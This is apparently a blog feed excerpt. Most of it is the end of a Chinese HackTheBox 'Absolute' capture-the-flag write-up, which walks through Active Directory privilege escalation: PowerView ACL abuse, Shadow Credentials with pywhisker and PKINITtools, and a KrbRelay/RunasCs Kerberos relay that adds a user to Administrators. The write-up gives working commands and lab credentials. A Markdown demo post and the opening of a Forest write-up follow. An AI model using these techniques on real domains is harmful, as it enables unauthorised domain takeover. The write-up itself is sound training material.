&lt;p&gt;本来想在&lt;code&gt;linux&lt;/code&gt;下用&lt;code&gt;wine&lt;/code&gt;来执行&lt;code&gt;test.exe&lt;/code&gt;的，但一执行就报错，我真的是哭死，最后还是老实上&lt;code&gt;win10&lt;/code&gt;，用之前记得到&lt;code&gt;C:\Windows\System32\drivers\etc&lt;/code&gt;把&lt;code&gt;host&lt;/code&gt;文件的内容和&lt;code&gt;linux&lt;/code&gt;的那个同步一下，整完这一套后抓到了一组新的用户名密码：&lt;code&gt;absolute.htb\m.lovegod:AbsoluteLDAP2022!&lt;/code&gt;，简单用&lt;code&gt;crackmapexec&lt;/code&gt;查一查，并没发现什么特殊的地方，用&lt;code&gt;bloodhound.py&lt;/code&gt;远程收集一下域信息试试。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927093435.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927173457.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;发现了这么些个用户，个人感觉比较有意思的部分都放到左上角了，重点关注一下这个&lt;code&gt;WINRM_USER&lt;/code&gt;，看名字就知道这个用户可以成为&lt;code&gt;evil-winrm&lt;/code&gt;的利用对象，我们从当前的&lt;code&gt;m.lovegod&lt;/code&gt;出发设置&lt;code&gt;StartNode&lt;/code&gt;，看看如何才能拿下&lt;code&gt;winrm_user&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927173844.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927182253.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927180845.png&quot; alt=&quot;&quot; /&gt;
能够看到&lt;code&gt;M.LOVEGOD&lt;/code&gt;对&lt;code&gt;NETWORK AUDIT&lt;/code&gt;组有&lt;code&gt;own&lt;/code&gt;权限，而&lt;code&gt;NETWORK AUDIT&lt;/code&gt;组又对&lt;code&gt;WINRM_USER&lt;/code&gt;有&lt;code&gt;GenericWrite&lt;/code&gt;权限。虽然&lt;code&gt;M.LOVEGOD&lt;/code&gt;不是&lt;code&gt;NETWORK AUDIT&lt;/code&gt;的成员，没法直接控制&lt;code&gt;WINRM_USER&lt;/code&gt;，但因为&lt;code&gt;own&lt;/code&gt;权限的存在，我们只需要把&lt;code&gt;M/LOVEGOD&lt;/code&gt;给加进&lt;code&gt;NETWORK AUDIT&lt;/code&gt;就完事儿了。我们踏步进入AD域渗透步骤。&lt;/p&gt;
&lt;p&gt;ps: 在Windows域中，&lt;code&gt;own&lt;/code&gt; 权限是指用户对资源具有完全控制权限，包括读取、写入、修改和删除等操作&lt;/p&gt;
&lt;p&gt;我们尽量在Windows的环境下来搞，Linux的稍有些麻烦，在进行操作之前我们要把DNS服务器设置一下，再把&lt;code&gt;Windows Defender&lt;/code&gt;给关了防杀&lt;code&gt;PS&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928124600.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928124832.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 导入 PowerView.ps1 和 Powermad.ps1 模块
Import-Module .\PowerView.ps1 
Import-Module .\Powermad.ps1 
// 设置密码为 &quot;AbsoluteLDAP2022!&quot; 并将其转换为安全字符串
$pass=ConvertTo-SecureString &apos;AbsoluteLDAP2022!&apos; -AsPlain -Force 
// 创建一个包含凭据的 PS 身份验证对象，凭据包括用户名 &apos;absolute.htb\m.lovegod&apos; 和密码 &apos;AbsoluteLDAP2022!&apos;。 
$cred=new-object system.management.automation.pscredential(&apos;absolute.htb\m.lovegod&apos;,$pass)
// 向 &quot;Network Audit&quot; 对象授予 &quot;m.lovegod&quot; 用户所有权限，使用提供的凭据连接到域控制器 &quot;dc.absolute.htb&quot;。
Add-DomainObjectAcl -Credential $cred -TargetIdentity &quot;Network Audit&quot; -Rights all -DomainController &quot;dc.absolute.htb&quot; -PrincipalIdentity &quot;m.lovegod&quot; 
// 将用户 &quot;m.lovegod&quot; 添加到 &quot;Network Audit&quot; 组中，使用提供的凭据连接到域 &quot;absolute.htb&quot;。 Add-DomainGroupMember -Credential $cred -Identity &quot;Network Audit&quot; -member m.lovegod -Domain &quot;absolute.htb&quot; 
// 获取属于 &quot;Network Audit&quot; 组的成员列表，并以成员名的格式进行输出。
3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果如下，成功将其加入&lt;code&gt;Network Audit&lt;/code&gt;组
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928130832.png&quot; alt=&quot;&quot; /&gt;
加入进&lt;code&gt;Network Audit&lt;/code&gt;组以后，需要重新生成&lt;code&gt;TGT&lt;/code&gt;。然后再通过&lt;code&gt;pkwhisker.py&lt;/code&gt;来修改属性申请&lt;code&gt;.pfx&lt;/code&gt;私钥证书，pywhisker下载地址：https://github.com/ShutdownRepo/pywhisker
&lt;code&gt;python pywhisker.py -d absolute.htb -u &quot;m.lovegod&quot; -k --no-pass -t &quot;winrm_user&quot; --action &quot;add&quot;&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928132532.png&quot; alt=&quot;&quot; /&gt;
拿到私钥文件后，再使用&lt;code&gt;PKINTtool&lt;/code&gt;获取&lt;code&gt;winrm&lt;/code&gt;的&lt;code&gt;TGT&lt;/code&gt;
&lt;code&gt;PKINTtool&lt;/code&gt;下载地址:  https://github.com/dirkjanm/PKINITtools&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3.11 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx /home/f4miti0n/桌面/xx/pywhisker-main/ypGDUuw9.pfx -pfx-pass wYSyHawOtHjT9jVixYmC winrmCcache
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928164322.png&quot; alt=&quot;&quot; /&gt;
成功拿到了winrm的TGT票据,&lt;code&gt;export&lt;/code&gt;一下之后拿&lt;code&gt;evil-winrm&lt;/code&gt;链接，这里就算成功拿到了普通用户权限，昂首踏步进入提权阶段&lt;/p&gt;
&lt;p&gt;ps:链接之前一定要把&lt;code&gt;/etc/krb5.conf&lt;/code&gt;给配置好了再来，看着wp一通做没配卡了挺长时间。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[libdefaults]  
        default_realm = ABSOLUTE.HTB  
[realms]  
        ABSOLUTE.HTB = {  
                kdc = DC.ABSOLUTE.HTB  
                admin_server = ABSOLUTE.HTB  
                }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928165542.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928170413.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;在进入提权阶段前先碎碎念一会儿，简单解释一下这里到底对&lt;code&gt;winrm&lt;/code&gt;这个用户做了些什么。在&lt;code&gt;Kerberos&lt;/code&gt;认证协议中，&lt;code&gt;TGT&lt;/code&gt;只能通过验证一个名为 &quot;预认证 &quot;的第一步来获得，预认证可以以对称方式（用DES、RC4、AES128或AES256密钥）或非对称方式（用证书）进行验证，而非对称的预认证方式被称其为&lt;code&gt;PKINIT&lt;/code&gt; 。&lt;code&gt;PKINIT&lt;/code&gt;是一个Kerberos协议的扩展协议，允许Kerberos预认证阶段中使用非对称密钥进行加密。基于PKINIT协议，客户端使用自身私钥对预验证数据（Pre-authentication Data）进行加密，KDC使用客户端的公钥进行解密（与数字证书相似），若KDC成功使用公钥解密，则返回&lt;code&gt;TGT&lt;/code&gt;票据。&lt;/p&gt;
&lt;p&gt;很不巧的是，KDC用于解密的公钥是可以被设置在指定目标的&lt;code&gt;msDs-KeyCredentialLink&lt;/code&gt;属性上的，而我们又恰好拥有修改&lt;code&gt;msDs-KeyCredentialLink&lt;/code&gt;的权限（别忘了，我们是&lt;code&gt;GenericWrite&lt;/code&gt;），所以我们自然能很轻松地拿到&lt;code&gt;winrm&lt;/code&gt;的&lt;code&gt;TGT&lt;/code&gt;，这里的&lt;code&gt;pywhisker.py&lt;/code&gt;是在修改&lt;code&gt;winrm&lt;/code&gt;的&lt;code&gt;msDs-KeyCredentialLink&lt;/code&gt;为我们的特定公钥，&lt;code&gt;gettgtpkint.py&lt;/code&gt;则是在启动这一套&lt;code&gt;pkint&lt;/code&gt;验证流程。&lt;/p&gt;
&lt;p&gt;ps: 我们把这一套流程叫做&lt;code&gt;Shadow Credentials&lt;/code&gt;，更多信息可以来学一下这篇文章，写的非常nice
https://forum.butian.net/share/1607&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;提权阶段用到的攻击手段是&lt;code&gt;Kerberos中继攻击&lt;/code&gt;，和之前在&lt;code&gt;Responder&lt;/code&gt;用到的&lt;code&gt;NTLM中继&lt;/code&gt;还有些许不同之处，我们先来学习一下。&lt;/p&gt;
&lt;p&gt;首先，我们重新回顾一下&lt;code&gt;NTLM Relay&lt;/code&gt;的基本原理，其中流程如图所示，不难看出我们攻击者的机器在这个流程中其实只是起到了一个中间人的作用，对 &lt;code&gt;Client&lt;/code&gt; 和 &lt;code&gt;Server&lt;/code&gt; 所传输数据进行双向转发。在之前的&lt;code&gt;Responder&lt;/code&gt;靶机里，我们就是把 &lt;code&gt;AUTHENTICATE&lt;/code&gt;拦截住，用&lt;code&gt;john&lt;/code&gt;对里面的&lt;code&gt;NTLM Hash&lt;/code&gt;进行破解以此得到password(当然，也可以把这个&lt;code&gt;NTLM Hash&lt;/code&gt;重放给其他服务)，利用起来非常的简单。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231008145714.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;但&lt;code&gt;Kerberos relay&lt;/code&gt;这里，一切就又不大一样了。因为Kerberos加强了通信前双方身份的认定工作，通过在Authentication Server Request (AS_REQ)中添加服务主体名称(SPN) ，导致最终获取的ST无法用于与其他SS(Service Server)通信，从而阻止中继到与服务主体名称不同的服务。&lt;/p&gt;
&lt;p&gt;但如果攻击者可以控制SPN，便可以顺利地中继到任意目标服务器。部分协议可以强制受害者向攻击者进行强制身份认证，并且在进行Kerberos身份认证时允许指定不同的SPN，包括以下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;IPSec and AuthIP,MSRPC,DCOM,HTTP,LLMNR,MDNS
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;攻击者使用以上协议控制受害者使用指定的SPN进行认证，在受害者拿到ST后会对攻击者进行AP_REQ请求，攻击者提取请求中的ST通过没有设置强制签名的协议进行中继。没有设置强制签名的协议如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;LDAP/LDAPS,HTTP,SMB
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也就是说Kerberos中继关键点在于这两种协议&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用于触发受害者客户端身份验证的协议，此协议要求可以指定SPN&lt;/li&gt;
&lt;li&gt;身份验证中继到的服务使用的协议，此协议要求不设置强制签名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总结下的话，Kerberos 中继的主要重点是拦截 AP-REQ，并将其中继到用于请求服务票证 （ST） 的服务主体名称 （SPN） 中指定的服务，其流程如下所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231008221339.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;关于&lt;code&gt;Kerberos Relay&lt;/code&gt;，我们有以下场景比较适合利用
三种利用场景:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用 SPN 的可伪造性，使客户端认为自己连接的是目标服务，而实际上是攻击者控制的服务。这样攻击者就可以截获客户端发送的票据，并用于访问目标服务。&lt;/li&gt;
&lt;li&gt;利用约束委派或资源约束委派的功能，使客户端向攻击者控制的服务请求一个新的票据，并用于访问目标服务。这样攻击者就可以利用客户端拥有的委派权限，来访问目标服务。&lt;/li&gt;
&lt;li&gt;利用 DCOM（分布式组件对象模型）协议中的一些特性，使客户端向攻击者控制的服务发送一个伪造的票据，并用于访问目标服务。这样攻击者就可以利用 DCOM 的对象引用机制，来伪造客户端的身份。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们这里着重学习下&lt;code&gt;DCOM Kerberos Relay&lt;/code&gt;，相关内容想深入学习可以看下面这篇文章，写的非常的nice  &lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html&quot;&gt;Proejct 0：Windows漏洞利用技巧：中继DCOM身份验证 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对文章里关于&lt;code&gt;DCOM Kerberos Relay&lt;/code&gt;原理的拙劣概括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DCOM是一种基于RPC（远程过程调用）的技术，它允许在不同的进程或主机之间使用COM（组件对象模型）对象。&lt;/li&gt;
&lt;li&gt;当一个COM对象被封送（marshal）时，即被转换为一个可以在不同环境中使用的数据结构，COM运行时会生成一个OBJREF（对象引用）结构，其中包含了连接到原始对象的所有信息，例如对象的类标识符（CLSID）、接口标识符（IID）、安全绑定信息（&lt;code&gt;这个身份验证信息包含了客户端的用户名、域名和密码哈希等信息&lt;/code&gt;）。和对象导出器标识符（OXID）等。客户端可以通过解封送（unmarshal）OBJREF来获取对远程对象的接口引用，并通过RPC调用其方法。&lt;/li&gt;
&lt;li&gt;从OBJREF连接到原始对象是一个两步过程：首先，客户端从OBJREF中提取OXID（对象导出器标识符），并联系OBJREF中指定的OXID解析器服务；其次，客户端使用OXID解析器服务来找到托管对象的COM服务器的RPC绑定信息，并建立连接到RPC端点，以访问对象的接口。&lt;/li&gt;
&lt;li&gt;这两个步骤都需要建立一个MSRPC连接到一个端点。通常这是本地通过ALPC（高级本地过程调用），或者远程通过TCP。&lt;code&gt;如果使用TCP连接，则客户端还会根据OBJREF中的安全绑定信息，使用NTLM或Kerberos对RPC服务器进行身份验证，如果OBJREF中包含了一个具有SYSTEM权限的COM对象的信息，那么它的身份验证信息就相当于SYSTEM用户的身份验证信息。这样，攻击者就截获可以利用这个身份验证信息信息来访问和控制系统的任何资源和任务，从而实现权限提升。&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;作者发现了一种方法，可以构造一个OBJREF，使得客户端总是通过TCP连接到OXID解析器服务，即使服务在本地机器上。这样做的方法是在OBJREF中指定主机名为IP地址，并指定一个任意的TCP端口供客户端连接。这样就可以在本地监听，并在RPC连接建立时中继或重用身份验证信息。&lt;/li&gt;
&lt;li&gt;这还不是一个权限提升，因为还需要说服一个有权限的用户解封送（unmarshal）OBJREF。作者发现了一种方法，可以使用&lt;code&gt;CoGetInstanceFromIStorage API&lt;/code&gt;，并激活一个有权限的COM服务，来轻松地让它解封送任意OBJREF (这里和&lt;code&gt;Potato&lt;/code&gt;攻击很像)。&lt;/li&gt;
&lt;li&gt;如果解封送的COM服务使用Kerberos进行身份验证，则可以利用Kerberos中继攻击的技术，将身份验证信息转发到网络服务，例如LDAP。这样就可以利用COM服务的权限来访问网络资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;理论知识的介绍到这里就完成了，关于&lt;code&gt;Kerberos Relay&lt;/code&gt;更多信息的可以看下面这篇文章，虽然是生肉，但内容很硬，啃一啃收获很多，我们正式进入实操阶段
&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html&quot;&gt;项目 Zero：使用 Kerberos 进行身份验证中继攻击 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先我们要把用来做KrbRelay的工具给下下来，在本地用&lt;code&gt;Visual Stduio&lt;/code&gt;打开其sln文件完成项目构建
&lt;a href=&quot;https://github.com/cube0x0/KrbRelay&quot;&gt;cube0x0/KrbRelay: Framework for Kerberos relaying (github.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009114540.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009114643.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;把&lt;code&gt;CheckPort.exe&lt;/code&gt;和&lt;code&gt;KrbRelay.exe&lt;/code&gt;这俩二进制文件用&lt;code&gt;upload&lt;/code&gt;上传到&lt;code&gt;winrm&lt;/code&gt;的主机上。先用&lt;code&gt;CheckPort.exe&lt;/code&gt;识别出恶意服务器将运行的端口，得到&lt;code&gt;10&lt;/code&gt;这个端口。再尝试使用&lt;code&gt;KrbRelay&lt;/code&gt;进行本地用户提权，spn参数指定为我们要打的服务，这里选择的目标是&lt;code&gt;ldap&lt;/code&gt;，同时要用&lt;code&gt;CLISD&lt;/code&gt;激活一个需要一个具有正确权限的有效RPC服务。&lt;a href=&quot;https://github.com/cube0x0/KrbRelay#clsids&quot;&gt;KrbRelay README&lt;/a&gt;上有一个操作系统默认clsid列表，clsid各不相同，通常可以使用默认的，比如TrustedInstaller的CLSID&lt;code&gt;8F5DF053-3013-4dd8-B5F4-88214E81C0CF&lt;/code&gt;，运行结果如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009154256.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;amazing，失败了（其实一点也不amazing，主要这里是为了方便下文引出&lt;code&gt;RunAsCs&lt;/code&gt;故意失败的）
此失败是由于该漏洞利用需要交互式会话，例如console。在这些会话中，密码凭据存储在内存中，因此可以被攻击者利用，这与现在使用的WinRM远程处理不同，而对于此问题，我们可以用RunAsCs来进行解决。&lt;/p&gt;
&lt;p&gt;这里搬一下别的博主对于&lt;code&gt;RunAsCs&lt;/code&gt;的介绍。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/antonioCoco/RunasCs&quot;&gt;RunAsCs&lt;/a&gt;允许以不同用户的身份运行，注意此处使用的是最新版本的RunasCs version 1.5。
RunasCs是一个实用程序，用于运行具有与用户当前登录不同权限的特定进程，使用明文密码。
&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types&quot;&gt;Administrative tools and logon types&lt;/a&gt;有一个logon type表。Runas/Network是logon type 9的示例。
目前，RunasCs支持多种&lt;a href=&quot;https://cybersafe.co.il/wp-content/uploads/2021/11/LOGON-types-compressed_compressed.pdf&quot;&gt;logon types&lt;/a&gt;，但最重要的是2、3和9。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Logon type 2: 就像box上的console。不幸的是，这种登录类型不能被DC上的每个人使用，因为它的先决条件是用户需要”交互式登录”权限，而域控制器上默认不授予这种权限。&lt;/li&gt;
&lt;li&gt;Logon type 3: 用户帐户控制(UAC)绕过，它还需要密码，并且基本上是网络交互式登录，因为它也需要”交互式登录”特权。&lt;/li&gt;
&lt;li&gt;Logon type 9: 这种登录类型与运行runas /netonly相同，这意味着不会检查密码，使用提供的密码在网络上进行身份验证。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里的交互式登录也就是在本地键盘上进行的登录，显然不适合我们当前的场景，&lt;code&gt;Logon type 9&lt;/code&gt;为当前的最好选择，因为通过网络作为另一个用户进行身份验证，可以使用任何密码，同时以自己的身份在本地运行应用程序，这里选择&lt;code&gt;Logon 9&lt;/code&gt;，将&lt;code&gt;RunAsCs.exe&lt;/code&gt;传到主机上后，执行以下命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.\rr.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 &quot;.\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10&quot;
//rr.exe就是RunAsCs.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下，ldap bind成功
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160016.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;趁热打铁，通过ldap服务来把&lt;code&gt;winrm&lt;/code&gt;加入到&lt;code&gt;Administrator&lt;/code&gt;组里&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.\rr.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 &quot;.\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160148.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;攻击成功，至此，提权结束，我们去读一下flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160451.png&quot; alt=&quot;&quot; /&gt;
PWN!
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160547.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;结尾吐槽一下，这题对于基础弱的来讲确实挺难的，别的不说，光东西就没少装，相关知识的中文资料还少的要命，得提高下英语能力啃生肉了。&lt;/p&gt;
</content:encoded></item><item><title>Markdown Example</title><link>https://f4miti0n.github.io/posts/markdown/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/markdown/</guid><description>A simple example of a Markdown blog post.</description><pubDate>Sun, 01 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;An h1 header&lt;/h1&gt;
&lt;p&gt;Paragraphs are separated by a blank line.&lt;/p&gt;
&lt;p&gt;2nd paragraph. &lt;em&gt;Italic&lt;/em&gt;, &lt;strong&gt;bold&lt;/strong&gt;, and &lt;code&gt;monospace&lt;/code&gt;. Itemized lists
look like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;this one&lt;/li&gt;
&lt;li&gt;that one&lt;/li&gt;
&lt;li&gt;the other one&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note that --- not considering the asterisk --- the actual text
content starts at 4-columns in.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Block quotes are
written like so.&lt;/p&gt;
&lt;p&gt;They can span multiple paragraphs,
if you like.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Use 3 dashes for an em-dash. Use 2 dashes for ranges (ex., &quot;it&apos;s all
in chapters 12--14&quot;). Three dots ... will be converted to an ellipsis.
Unicode is supported. ☺&lt;/p&gt;
&lt;h2&gt;An h2 header&lt;/h2&gt;
&lt;p&gt;Here&apos;s a numbered list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;first item&lt;/li&gt;
&lt;li&gt;second item&lt;/li&gt;
&lt;li&gt;third item&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Note again how the actual text starts at 4 columns in (4 characters
from the left side). Here&apos;s a code sample:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Let me re-iterate ...
for i in 1 .. 10 { do-something(i) }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you probably guessed, indented 4 spaces. By the way, instead of
indenting the block, you can use delimited blocks, if you like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;define foobar() {
    print &quot;Welcome to flavor country!&quot;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(which makes copying &amp;amp; pasting easier). You can optionally mark the
delimited block for Pandoc to syntax highlight it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import time
# Quick, count to ten!
for i in range(10):
    # (but not *too* quick)
    time.sleep(0.5)
    print i
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;An h3 header&lt;/h3&gt;
&lt;p&gt;Now a nested list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;First, get these ingredients:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;carrots&lt;/li&gt;
&lt;li&gt;celery&lt;/li&gt;
&lt;li&gt;lentils&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Boil some water.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Dump everything in the pot and follow
this algorithm:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; find wooden spoon
 uncover pot
 stir
 cover pot
 balance wooden spoon precariously on pot handle
 wait 10 minutes
 goto first step (or shut off burner when done)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Do not bump wooden spoon or it will fall.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Notice again how text always lines up on 4-space indents (including
that last line which continues item 3 above).&lt;/p&gt;
&lt;p&gt;Here&apos;s a link to &lt;a href=&quot;http://foo.bar&quot;&gt;a website&lt;/a&gt;, to a &lt;a href=&quot;local-doc.html&quot;&gt;local
doc&lt;/a&gt;, and to a &lt;a href=&quot;#an-h2-header&quot;&gt;section heading in the current
doc&lt;/a&gt;. Here&apos;s a footnote [^1].&lt;/p&gt;
&lt;p&gt;[^1]: Footnote text goes here.&lt;/p&gt;
&lt;p&gt;Tables can look like this:&lt;/p&gt;
&lt;p&gt;size material color&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;9 leather brown
10 hemp canvas natural
11 glass transparent&lt;/p&gt;
&lt;p&gt;Table: Shoes, their sizes, and what they&apos;re made of&lt;/p&gt;
&lt;p&gt;(The above is the caption for the table.) Pandoc also supports
multi-line tables:&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;keyword text&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;red Sunsets, apples, and
other red or reddish
things.&lt;/p&gt;
&lt;p&gt;green Leaves, grass, frogs
and other things it&apos;s
not easy being.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;A horizontal rule follows.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Here&apos;s a definition list:&lt;/p&gt;
&lt;p&gt;apples
: Good for making applesauce.
oranges
: Citrus!
tomatoes
: There&apos;s no &quot;e&quot; in tomatoe.&lt;/p&gt;
&lt;p&gt;Again, text is indented 4 spaces. (Put a blank line between each
term/definition pair to spread things out more.)&lt;/p&gt;
&lt;p&gt;Here&apos;s a &quot;line block&quot;:&lt;/p&gt;
&lt;p&gt;| Line one
| Line too
| Line tree&lt;/p&gt;
&lt;p&gt;and images can be specified like so:&lt;/p&gt;
&lt;p&gt;Inline math equations go in like so: $\omega = d\phi / dt$. Display
math should get its own line and be put in in double-dollarsigns:&lt;/p&gt;
&lt;p&gt;$$I = \int \rho R^{2} dV$$&lt;/p&gt;
&lt;p&gt;$$
\begin{equation*}
\pi
=3.1415926535
;8979323846;2643383279;5028841971;6939937510;5820974944
;5923078164;0628620899;8628034825;3421170679;\ldots
\end{equation*}
$$&lt;/p&gt;
&lt;p&gt;And note that you can backslash-escape any punctuation characters
which you wish to be displayed literally, ex.: `foo`, *bar*, etc.&lt;/p&gt;
</content:encoded></item><item><title>HackTheBox Forest</title><link>https://f4miti0n.github.io/posts/forest/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/forest/</guid><pubDate>Tue, 19 Sep 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;启动靶机得到IP：&lt;code&gt;10.10.10.161&lt;/code&gt;，常规套路nmap扫一下得到以下端口信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT     STATE SERVICE      VERSION  
53/tcp   open  domain       Simple DNS Plus  
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-31 07:49:08Z)  
135/tcp  open  msrpc        Microsoft Windows RPC  
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn  
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;
